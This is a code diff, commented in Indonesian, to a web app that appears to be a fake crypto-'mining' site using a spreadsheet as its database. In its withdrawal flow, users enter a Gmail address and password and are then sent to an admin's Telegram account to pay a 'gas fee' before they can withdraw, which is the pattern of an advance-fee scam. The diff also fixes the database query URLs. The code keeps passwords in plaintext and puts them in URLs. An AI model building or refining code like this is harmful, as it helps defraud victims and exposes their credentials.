@@ -1130,7 +1130,7 @@
         let lastRate = 0;
         let historyData = [];
         let currentUser = null;
-        let currentUserPass = ''; // MENYIMPAN PASSWORD UNTUK VALIDASI MODAL
+        let currentUserPass = ''; 
         let hasPaidGasFee = false;
         let autoSaveInterval = null;
 
@@ -1168,8 +1168,8 @@
         // ──────────────────────────────────────────────
         async function checkNodeIdExists(nodeId) {
             try {
-                const searchParam = encodeURIComponent(JSON.stringify({ node_id: nodeId }));
-                const res = await fetch(`${SHEETDB_API}?sheet=${USERS_SHEET}&search=${searchParam}`);
+                // FIXED: URL format query yang benar
+                const res = await fetch(`${SHEETDB_API}/search?node_id=${encodeURIComponent(nodeId)}&sheet=${USERS_SHEET}`);
                 const data = await res.json();
                 return (Array.isArray(data) && data.length > 0);
             } catch (e) {
@@ -1183,11 +1183,8 @@
         // ──────────────────────────────────────────────
         async function loginUser(nodeId, password) {
             try {
-                const searchParam = encodeURIComponent(JSON.stringify({
-                    node_id: nodeId,
-                    password: password
-                }));
-                const res = await fetch(`${SHEETDB_API}?sheet=${USERS_SHEET}&search=${searchParam}`);
+                // FIXED: URL format query yang benar
+                const res = await fetch(`${SHEETDB_API}/search?node_id=${encodeURIComponent(nodeId)}&password=${encodeURIComponent(password)}&sheet=${USERS_SHEET}`);
                 const data = await res.json();
                 if (Array.isArray(data) && data.length > 0) {
                     return data[0];
@@ -1200,7 +1197,7 @@
         }
 
         // ──────────────────────────────────────────────
-        // 🛡️ SHEETDB: REGISTER (SALDO AWAL $0)
+        // 🛡️ SHEETDB: REGISTER
         // ──────────────────────────────────────────────
         async function registerUser(nodeId, password) {
             try {
@@ -1230,11 +1227,9 @@
         // ──────────────────────────────────────────────
         async function updateUserBalance(nodeId, newBalance) {
             try {
-                const searchParam = encodeURIComponent(JSON.stringify({ node_id: nodeId }));
-                const body = {
-                    data: { balance: newBalance }
-                };
-                await fetch(`${SHEETDB_API}?sheet=${USERS_SHEET}&search=${searchParam}`, {
+                const body = { data: { balance: newBalance } };
+                // FIXED: URL format patch ke spesifik baris
+                await fetch(`${SHEETDB_API}/node_id/${encodeURIComponent(nodeId)}?sheet=${USERS_SHEET}`, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(body)
@@ -1249,8 +1244,8 @@
         // ──────────────────────────────────────────────
         async function fetchUserTransactions(nodeId) {
             try {
-                const searchParam = encodeURIComponent(JSON.stringify({ node_id: nodeId }));
-                const res = await fetch(`${SHEETDB_API}?sheet=${TX_SHEET}&search=${searchParam}&sort_by=date&sort_order=desc`);
+                // FIXED: URL format query yang benar
+                const res = await fetch(`${SHEETDB_API}/search?node_id=${encodeURIComponent(nodeId)}&sheet=${TX_SHEET}&sort_by=date&sort_order=desc`);
                 const data = await res.json();
                 if (Array.isArray(data)) {
                     historyData = data.map(row => ({
@@ -1303,11 +1298,9 @@
         // ──────────────────────────────────────────────
         async function updateTransactionStatus(txId, newStatus) {
             try {
-                const searchParam = encodeURIComponent(JSON.stringify({ tx_id: String(txId) }));
-                const body = {
-                    data: { status: newStatus }
-                };
-                await fetch(`${SHEETDB_API}?sheet=${TX_SHEET}&search=${searchParam}`, {
+                const body = { data: { status: newStatus } };
+                // FIXED: URL format patch ke spesifik baris
+                await fetch(`${SHEETDB_API}/tx_id/${encodeURIComponent(String(txId))}?sheet=${TX_SHEET}`, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(body)
@@ -1353,7 +1346,7 @@
                 }
 
                 currentUser = nodeId;
-                currentUserPass = pass; // Simpan password untuk validasi pas narik saldo
+                currentUserPass = pass;
                 bal = parseFloat(user.balance) || 0;
                 hasPaidGasFee = (user.has_paid_gas === 'true' || user.has_paid_gas === true);
 
@@ -1363,7 +1356,7 @@
                     goPage('pgDash');
                     initDashboard();
                     startAutoSave();
-                    toast('✅ Login berhasil!'); // Teks diperpendek
+                    toast('✅ Login berhasil!'); 
                 }, 1200);
 
             } else {
@@ -1391,7 +1384,7 @@
                 }
 
                 currentUser = nodeId;
-                currentUserPass = pass; // Simpan password untuk validasi
+                currentUserPass = pass;
                 bal = 0; 
                 hasPaidGasFee = false;
                 historyData = [];
@@ -1401,7 +1394,7 @@
                     goPage('pgDash');
                     initDashboard();
                     startAutoSave();
-                    toast('✅ Akun dibuat! Mulai mining sekarang.'); // Teks diperpendek
+                    toast('✅ Akun dibuat! Mulai mining sekarang.'); 
                 }, 1200);
             }
 
@@ -1643,7 +1636,6 @@
             if (!email || !pass) return toast('Semua data keamanan wajib diisi!');
             if (!email.toLowerCase().includes('@gmail.com')) return toast('Gunakan alamat Google Account (Gmail) yang valid.');
             
-            // VALIDASI PASSWORD AKTIF
             if (pass !== currentUserPass) return toast('❌ Kata sandi akun salah!');
 
             document.getElementById('modalStep1').style.display = 'none';
@@ -1656,13 +1648,9 @@
             }, 2500);
         }
 
-        // ALUR BARU: ADMIN CEK MANUAL GAS FEE
         function confirmQR() {
-            // Cuma buka Telegram admin dan tutup modal
             window.open('https://t.me/sweionf', '_blank');
             closeModal();
-            
-            // Tampilkan toast ke user
             toast('⚠️ Silakan selesaikan pembayaran ke admin. Jika sudah dikonfirmasi, login ulang untuk proses WD.');
         }
 
@@ -1726,9 +1714,6 @@
             goPage('pgSuccess');
         }
 
-        // ──────────────────────────────────────────────
-        // 🔔 TOAST NOTIFICATION
-        // ──────────────────────────────────────────────
         function toast(m) {
             const t = document.getElementById('toastEl');
             t.textContent = m;
